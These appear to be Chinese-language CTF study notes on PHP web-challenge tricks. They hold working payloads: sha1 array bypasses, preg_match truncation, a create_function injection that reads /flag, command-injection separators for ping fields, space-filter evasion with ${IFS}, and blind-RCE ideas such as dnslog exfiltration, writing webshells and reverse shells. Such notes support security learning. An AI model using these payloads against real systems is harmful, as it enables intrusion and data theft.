



## 1、PHP

### 0、php特性了解

-   **php在解析字符串时会把点和空格解析成 _** 





### 1、php方法特性以及绕过方式

#### sha1()

-   **计算字符串的 sha1 散列值**

```php
if (sha1('apple') === 'd0be2dc421be4fcd0172e5afceea3970e2f3d940') {}
    
例子：if (sha1($shana) === sha1($passwd) && $shana != $passwd ){}
    # 绕过例子：$shana[]=1&$passwd[]=2
    # 绕过原理：sha1()函数无法处理数组，$shana和$passwd都是数组时，都是false	
```

#### preg_match()

-   **执行匹配正则表达式,**

```nginx
绕过原理：1、它会努力去匹配第一行，可以利用多行的方法【%0A】截断，也可以使用【%00】截断
			但受限以下两种情况下可以使用【%00】截断
			magic_quotes_gpc=off
 			php<5.3.4
	
		2、可以利用空字符串绕过正则
		3、也可以利用回溯绕过
案例：
	preg_match('/^dsf$/') 可以加上换行符%0a截断绕过(ds%0af)，因为这个正则是需要固定出现
```

#### basename()

-   **返回路径中的文件名部分**

```

```

#### create_function

```php
create_function()： 通过执行代码字符串创建动态函数
    如果【_】被过滤可以使用：命名空间【\】绕过，只需要再函数名
	获取flag的方式使用：get_defined_vars()，获取到上下文所有的参数值
	代码注入时选择得注释符号可以是#，也可以是\\，但是#需要编码，即%23
正常使用案例：
<?php
    $new = create_function('$a,$b','return $a * $b;');
    echo $new(1,2);
?>
    // 等价以下
    <?php
        function lambda1('$a,$b'){
    		return $a * $b;	
		}
	?>

实际案例：
    $a = $_GET['a'];
    $b = $_GET['b'];
	# 第一个字符不能是字母
    if(preg_match('/^[a-z0-9_]*$/isD',$a)){
        show_source(__FILE__);
    }
    else{
        $a('',$b);		// 从这里构成create_function
    }
创建绕过方式案例：
    #  	var_dump()：打印变量的相关信息，可执行函数
    # 	scandir()：列出指定路径中的文件和目录
	a=\create_function&b=return 'mmkjhhsd';}var_dump(scandir('/'));/*
	发现根目录下有一个flag文件
	a=\create_function&b=return 'mmkjhhsd';}var_dump(file_get_contents('/flag'));/*

```



### 2、命令执行

>   前提条件：**默认php.ini配置文件中是不禁止你调用执行外部命令的函数的，需要通过disable_functions修改**

>   php 4种**执行系统外部命令函数**：exec()、passthru()、system()、 shell_exec()

>   passthru与system的区别，passthru直**接将结果输出到浏览器，**
>
>   **不需要使用 echo 或 return 来查看结果，不返回任何值**，且其可以输出二进制，比如图像数据

>   system和exec的区别在于system在执行系统外部命令时，**直接将结果输出到浏览器**，
>
>   **不需要使用 echo 或 return 来查看结果**，如果执行命令成功则返回true，否则返回false。
>
>   第二个参数与exec第三个参数含义一样

### 0、一些绕过

-   绕过`shell_exec()`函数的特性

-   shell_exec() 函数实际上仅是反撇号 【`】 操作符的变体

-   ```nginx
    //命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。
    $resultData = shell_exec($command);
    ```

-   用于尝试代表题目：[GXYCTF 2019]Ping Ping Ping

    -   linux下

        -   ```bash
            # 空格过滤
            ${IFS}	代替空格
            $IFS$9	代替空格
            $IFS$1	代替空格
            常见的绕过符号有：
            $IFS$9 、${IFS} 、%09(php环境下)、 重定向符<>、<、
            
            # $IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，加一个{}就固定了变量名，
            # $IFS$9后面之所以加个$是为了起到截断的作用
            ```

        -   内联执行

            -   ```nginx
                在linux系统中，反引号是作为内联执行，输出查询结果的内容。
                比如:
                	用ls查询出index.php。那么`ls`就代表了index.php这个文件,如果存在多个文件那么就代表这多个文件，使用cat命令去读，会读所有的文件
                ls
                cat `ls`
                ```

        -   base64编码绕过

        -   设置变量名

        -   单双引号绕过

-   `exec()`函数特性（一般考察无回显 RCE）

-   **exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行**

    -   ```nginx
        # 不直接输入结果内容，命令执行结果的最后一行内容，
        # 第二个参数可获取到所有返回结果，每行结果作为一个数组记录，
        # 第三个参数返回命令执行的状态码，0代表成功1失败
        $resultData =exec($command,$output,$returnVal);
        	一般执行是没有回显的，但是可以搭配tee命令使用
        tee命令：
        	是将想要执行的命令写入到一个文件中，然后再去访问这个文件就会执行写入的命令
        	如输入命令：ls /|tee 1.txt
        	然后再通过：http://url/1.txt 就会返回执行ls / 的结果
        ```

    -   ```nginx
        利用绕过：
        如存在以下过滤：
        if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
            {}
        通过过滤会执行：exec($url);
        	绕过方法：
        		没有过滤掉 \ ,所有可以通过添加\突破限制
        		由于没有回显所有可以考虑配合linux中的tee命令将命令写入文件在访问获取
        ```

        

#### 1、ping命令相关的命令执行

**正常情况有五种写法**

```bash
127.0.0.1&&+code	# 左边命令的值为真执行左边，否则执行右边
127.0.0.1&+code		# &表示将任务置于后台执行
127.0.0.1||+code	# 左边的命令返回假才执行右边的
127.0.0.1|+code		# |表管道，上一条命令的输出，作为下一条命令的参数
127.0.0.1;+code		# 多行语句用换行区分代码块，单行语句用分号区分
	# 代表题目：[GXYCTF 2019]Ping Ping Ping
```

#### 2、无回显RCE

**做题思路**：

1.   利用dnslog带外
2.   写马
3.   反弹shell
4.   写文件然后访问文件